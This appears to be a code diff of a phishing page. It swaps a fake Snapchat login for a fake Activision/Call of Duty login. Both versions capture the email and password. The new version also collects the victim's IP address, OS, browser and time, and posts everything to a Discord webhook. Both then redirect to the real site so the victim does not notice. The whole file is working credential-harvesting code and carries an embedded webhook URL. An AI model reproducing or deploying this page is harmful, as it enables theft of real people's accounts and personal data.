@@ -3,140 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log In - Snapchat</title>
+    <title>Call of Duty - Login</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #FFFC00;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 360px;
-            text-align: center;
-        }
-        .logo {
-            width: 60px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 30px;
-            color: #333;
-        }
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: bold;
-            color: #555;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 16px;
-            box-sizing: border-box;
-            background-color: #f9f9f9;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #000;
-            background-color: #fff;
-        }
-        .forgot-password {
-            display: block;
-            text-align: right;
-            font-size: 14px;
-            color: #007BFF;
-            text-decoration: none;
-            margin-bottom: 30px;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 14px;
-            background-color: #000;
-            color: white;
-            border: none;
-            border-radius: 24px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        .login-btn:hover {
-            background-color: #333;
-        }
+        body { background-color: #000; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-image: url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touchui/kronos/common/bgs/bg-image-s6.jpg'); background-size: cover; }
+        .login-container { background: rgba(0, 0, 0, 0.8); padding: 40px; border-radius: 8px; width: 300px; text-align: center; border: 1px solid #333; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #ff0000; color: white; border: none; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button:hover { background: #cc0000; }
     </style>
 </head>
 <body>
-
-    <div class="login-container">
-        <svg class="logo" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg"><path fill="#FFFC00" d="M0 0h128v128H0z"/><path d="M63.8 21.3c-14.5 0-26 11.2-26 25.5 0 2.2.3 4.3.8 6.3-1.6 1.4-3.5 2.5-5.6 3.1-2.9.8-5.9.3-8.4-1.3-1.3-.8-2.8-1-4.2-.6-1.5.4-2.7 1.5-3.3 2.9-.6 1.5-.5 3.2.3 4.6.8 1.4 2.2 2.4 3.8 2.6 4.3.6 8.3 2.6 11.4 5.7 1.5 1.5 2.5 3.5 2.9 5.6.4 2.1.1 4.3-.8 6.2-1.3 2.8-3.5 5.1-6.2 6.5-1.4.7-2.4 2-2.7 3.5-.3 1.5.1 3.1 1.1 4.2 1 1.2 2.5 1.8 4 1.7 4.2-.2 8.2-1.6 11.5-4 2-1.5 4.5-2.2 7-2.1 2.5.1 4.9 1 6.8 2.6 3.1 2.6 7.1 4 11.2 4s8.1-1.4 11.2-4c1.9-1.6 4.3-2.5 6.8-2.6 2.5-.1 5 .6 7 2.1 3.3 2.4 7.3 3.8 11.5 4 1.5.1 3-.5 4-1.7 1-1.2 1.4-2.7 1.1-4.2-.3-1.5-1.3-2.8-2.7-3.5-2.7-1.4-4.9-3.7-6.2-6.5-.9-1.9-1.2-4.1-.8-6.2.4-2.1 1.4-4.1 2.9-5.6 3.1-3.1 7.1-5.1 11.4-5.7 1.6-.2 3-1.2 3.8-2.6.8-1.4.9-3.1.3-4.6-.6-1.5-1.8-2.5-3.3-2.9-1.5-.4-3-.2-4.2.6-2.5 1.6-5.5 2.1-8.4 1.3-2.1-.6-4-1.7-5.6-3.1.5-2 .8-4.1.8-6.3 0-14.3-11.5-25.5-26-25.5z" fill="#000"/></svg>
-        
-        <h1>Log In to Snapchat</h1>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="email">Username or Email</label>
-                <input type="text" id="email" name="email" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            
-            <a href="#" class="forgot-password">Forgot Password?</a>
-            
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-    </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
-            
-            const payload = {
-                content: `🚨 **New Snapchat Login Captured!** 🚨\n\n**Username/Email:** \`${email}\`\n**Password:** \`${password}\``
-            };
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // Redirect to the real Snapchat login page to avoid suspicion
-                window.location.href = 'https://accounts.snapchat.com/';
-            }).catch(err => {
-                console.error('Error sending data:', err);
-                // Still redirect even if the webhook fails, to maintain the illusion
-                window.location.href = 'https://accounts.snapchat.com/';
-            });
+<div class="login-container">
+    <h2>ACTIVISION</h2>
+    <p>LOGIN TO YOUR ACCOUNT</p>
+    <input type="email" id="email" placeholder="Email Address" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="sendData()">SIGN IN</button>
+</div>
+<script>
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+    async function sendData() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const time = new Date().toLocaleString();
+        const userAgent = navigator.userAgent;
+        let os = 'Unknown OS';
+        if (userAgent.indexOf('Win') != -1) os = 'Windows';
+        if (userAgent.indexOf('Mac') != -1) os = 'MacOS';
+        if (userAgent.indexOf('Linux') != -1) os = 'Linux';
+        if (userAgent.indexOf('Android') != -1) os = 'Android';
+        if (userAgent.indexOf('like Mac') != -1) os = 'iOS';
+        let browser = 'Unknown Browser';
+        if(userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+        else if(userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = 'Opera';
+        else if(userAgent.indexOf('Edge') > -1) browser = 'Edge';
+        else if(userAgent.indexOf('Chrome') > -1) browser = 'Chrome';
+        else if(userAgent.indexOf('Safari') > -1) browser = 'Safari';
+        let ip = 'Unknown IP';
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            ip = data.ip;
+        } catch (error) {}
+        const payload = {
+            content: '🚨 **New Login Captured!** 🚨',
+            embeds: [{
+                title: 'Call of Duty Credential Harvest',
+                color: 16711680,
+                fields: [
+                    { name: 'Email', value: email, inline: true },
+                    { name: 'Password', value: password, inline: true },
+                    { name: 'IP Address', value: ip, inline: false },
+                    { name: 'OS', value: os, inline: true },
+                    { name: 'Browser', value: browser, inline: true },
+                    { name: 'Time', value: time, inline: false }
+                ]
+            }]
+        };
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            window.location.href = 'https://profile.callofduty.com/cod/login';
         });
-    </script>
+    }
+</script>
 </body>
 </html>
